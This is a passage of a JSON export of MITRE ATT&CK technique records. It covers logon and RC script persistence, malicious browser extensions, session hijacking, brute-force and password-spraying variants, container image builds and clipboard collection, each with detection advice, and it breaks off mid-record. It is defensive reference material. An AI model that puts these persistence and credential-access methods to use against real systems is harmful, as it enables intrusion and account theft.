{"ID":"T1037.001","name":"Boot or Logon Initialization Scripts: Logon Script (Windows)","description":"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ","url":"https://attack.mitre.org/techniques/T1037/001","created":"10 January 2020","last modified":"24 March 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\Environment\\UserInitMprLogonScript</code>.\n\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation","is sub-technique":true,"sub-technique of":"T1037","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Unit 42 Playbook Dec 2017),(Citation: ESET Sednit Part 1),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Talos Seduploader Oct 2017),(Citation: ESET Attor Oct 2019),(Citation: ESET Zebrocy Nov 2018),(Citation: Cybereason Kimsuky November 2020),"}
{"ID":"T1037.003","name":"Boot or Logon Initialization Scripts: Network Logon Script","description":"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.","url":"https://attack.mitre.org/techniques/T1037/003","created":"10 January 2020","last modified":"24 March 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":"Windows","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1037","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1037.004","name":"Boot or Logon Initialization Scripts: RC Scripts","description":"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)","url":"https://attack.mitre.org/techniques/T1037/004","created":"15 January 2020","last modified":"27 April 2021","version":"2.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.\n\nMonitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present. ","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1037","defenses bypassed":null,"contributors":null,"permissions required":"root","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: objsee mac malware 2017),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Intezer HiddenWasp Map 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: NCSC Cyclops Blink February 2022),"}
{"ID":"T1037.005","name":"Boot or Logon Initialization Scripts: Startup Items","description":"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.","url":"https://attack.mitre.org/techniques/T1037/005","created":"15 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\n\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.","platforms":"macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1037","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky Adwind Feb 2016),"}
{"ID":"T1176","name":"Browser Extensions","description":"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.(Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control.(Citation: Chrome Extension C2 Malware)","url":"https://attack.mitre.org/techniques/T1176","created":"16 January 2018","last modified":"20 April 2022","version":"1.2","tactics":"Persistence","detection":"Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.\n\nMonitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.\n\nOn macOS, monitor the command line for usage of the profiles tool, such as <code>profiles install -type=configuration</code>. Additionally, all installed extensions maintain a <code>plist</code> file in the <code>/Library/Managed Preferences/username/</code> directory. Ensure all listed files are in alignment with approved extensions.(Citation: xorrior chrome extensions macOS)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation, Windows Registry: Windows Registry Key Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Chris Ross @xorrior; Justin Warner, ICEBRG","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: IBM Grandoreiro April 2020),(Citation: Malwarebytes Crossrider Apr 2018),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Zdnet Kimsuky Dec 2018),(Citation: Intego Shlayer Apr 2018),(Citation: Technospot Chrome Extensions GP)"}
{"ID":"T1217","name":"Browser Information Discovery","description":"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)","url":"https://attack.mitre.org/techniques/T1217","created":"18 April 2018","last modified":"16 April 2023","version":"2.0","tactics":"Discovery","detection":"Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Manikantan Srinivasan, NEC Corporation India; Mike Kemmerer; Yinon Engelsman, Talon Cyber Security; Yonatan Gotlib, Talon Cyber Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybereason PowerLess February 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: NCC Group Chimera January 2021),(Citation: Securelist Calisto July 2018),(Citation: Github PowerShell Empire),(Citation: Mandiant UNC3890 Aug 2022),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Securelist Dtrack),(Citation: ESET Machete July 2019),(Citation: CyberBit Dtrack),(Citation: SentinelLabs Metador Sept 2022),(Citation: BiZone Lizar May 2021),(Citation: Threatpost Lizar May 2021),(Citation: Scarlet Mimic Jan 2016),"}
{"ID":"T1185","name":"Browser Session Hijacking","description":"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)","url":"https://attack.mitre.org/techniques/T1185","created":"16 January 2018","last modified":"25 February 2022","version":"2.0","tactics":"Collection","detection":"This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. New processes may not be created and no additional software dropped to disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for [Process Injection](https://attack.mitre.org/techniques/T1055) against browser applications.","platforms":"Windows","data sources":"Logon Session: Logon Session Creation, Process: Process Access, Process: Process Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Justin Warner, ICEBRG","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: IBM Grandoreiro April 2020),(Citation: Trusteer Carberp October 2010),(Citation: Dell Dridex Oct 2015),(Citation: Kaspersky QakBot September 2021),(Citation: Fidelis TrickBot Oct 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: IBM TrickBot Nov 2016),(Citation: ESET Grandoreiro April 2020),(Citation: IBM IcedID November 2017),(Citation: Prevx Carberp March 2011),(Citation: Juniper IcedID June 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: cobaltstrike manual),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Microsoft Totbrick Oct 2017),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Bitdefender Agent Tesla April 2020),"}
{"ID":"T1110","name":"Brute Force","description":"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.","url":"https://attack.mitre.org/techniques/T1110","created":"31 May 2017","last modified":"14 April 2023","version":"2.5","tactics":"Credential Access","detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, User Account: User Account Authentication","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend Micro; David Fiser, @anu4is, Trend Micro; Ed Williams, Trustwave, SpiderLabs; Magno Logan, @magnologan, Trend Micro; Mohamed Kmal; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Kroll Qakbot June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Chaos Stolen Backdoor),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye APT39 Jan 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Kaspersky QakBot September 2021),(Citation: Aqua Kinsing April 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: SecureWorks August 2019),(Citation: CME Github September 2018),(Citation: CERT-FR PYSA April 2020),(Citation: Microsoft Targeting Elections September 2020),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: GitHub PoshC2),(Citation: Securelist DarkVishnya Dec 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Kaspersky Turla),(Citation: ClearSky Pay2Kitten December 2020),(Citation: TrendMicro Pawn Storm 2019),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"}
{"ID":"T1110.004","name":"Brute Force: Credential Stuffing","description":"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)","url":"https://attack.mitre.org/techniques/T1110/004","created":"11 February 2020","last modified":"14 April 2023","version":"1.3","tactics":"Credential Access","detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1110","defenses bypassed":null,"contributors":"Anastasios Pingios; Diogo Fernandes","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: ESET Trickbot Oct 2020),(Citation: Bitdefender Trickbot March 2020),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"}
{"ID":"T1110.002","name":"Brute Force: Password Cracking","description":"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.","url":"https://attack.mitre.org/techniques/T1110/002","created":"11 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Credential Access","detection":"It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).","platforms":"Azure AD, Linux, Network, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1110","defenses bypassed":null,"contributors":"Mohamed Kmal","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye FIN6 April 2016),(Citation: Cylance Cleaver),(Citation: US-CERT TA18-074A),(Citation: FireEye APT41 Aug 2019),(Citation: APT3 Adversary Emulation Plan),(Citation: Kali Hydra),(Citation: McAfee Night Dragon),(Citation: NIST 800-63-3)"}
{"ID":"T1110.001","name":"Brute Force: Password Guessing","description":"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.","url":"https://attack.mitre.org/techniques/T1110/001","created":"11 February 2020","last modified":"14 April 2023","version":"1.4","tactics":"Credential Access","detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1110","defenses bypassed":null,"contributors":"Microsoft Threat Intelligence Center (MSTIC); Mohamed Kmal","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Emotet Dec 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: FireEye Periscope March 2018),(Citation: ANSSI Sandworm January 2021),(Citation: Secureworks Emotet Nov 2018),(Citation: Malwarebytes Pony April 2016),(Citation: Trend Micro Xbash Sept 2018),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CME Github September 2018),(Citation: Symantec Emotet Jul 2018),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: CIS Emotet Dec 2018),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: US-CERT Emotet Jul 2018),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"}
{"ID":"T1110.003","name":"Brute Force: Password Spraying","description":"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.","url":"https://attack.mitre.org/techniques/T1110/003","created":"11 February 2020","last modified":"14 April 2023","version":"1.3","tactics":"Credential Access","detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\n\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\n\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1110","defenses bypassed":null,"contributors":"John Strand; Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSRC Nobelium June 2021),(Citation: Novetta Blockbuster),(Citation: Symantec Leafminer July 2018),(Citation: GitHub MailSniper),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Holmium June 2020),(Citation: SecureWorks August 2019),(Citation: FireEye APT33 Guardrail),(Citation: DOJ Iran Indictments March 2018),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: CME Github September 2018),(Citation: Anomali Linux Rabbit 2018),(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: Secure List Bad Rabbit),(Citation: Microsoft Targeting Elections September 2020),(Citation: Novetta Blockbuster RATs),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"}
{"ID":"T1612","name":"Build Image on Host","description":"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ","url":"https://attack.mitre.org/techniques/T1612","created":"30 March 2021","last modified":"15 April 2023","version":"1.3","tactics":"Defense Evasion","detection":"Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code.","platforms":"Containers","data sources":"Image: Image Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Assaf Morag, @MoragAssaf, Team Nautilus Aqua Security; Michael Katchinskiy, @michael64194968, Team Nautilus Aqua Security; Roi Kol, @roykol1, Team Nautilus Aqua Security; Vishwas Manral, McAfee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide)"}
{"ID":"T1115","name":"Clipboard Data","description":"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)","url":"https://attack.mitre.org/techniques/T1115","created":"31 May 2017","last modified":"14 April 2023","version":"1.2","tactics":"Collection","detection":"Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: McAfee Gold Dragon),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Cybereason Astaroth Feb 2019),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Talos Konni May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: Unit42 Redaman January 2019),(Citation: Riskiq Remcos Jan 2018),(Citation: Korean FSI TA505 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Symantec Catchamas April 2018),(Citation: Securelist Machete Aug 2014),(Citation: Talos Agent Tesla Oct 2018),(Citation: objsee mac malware 2017),(Citation: Github PowerShell Empire),(Citation: Palo Alto OilRig May 2016),(Citation: Fortinet Agent Tesla June 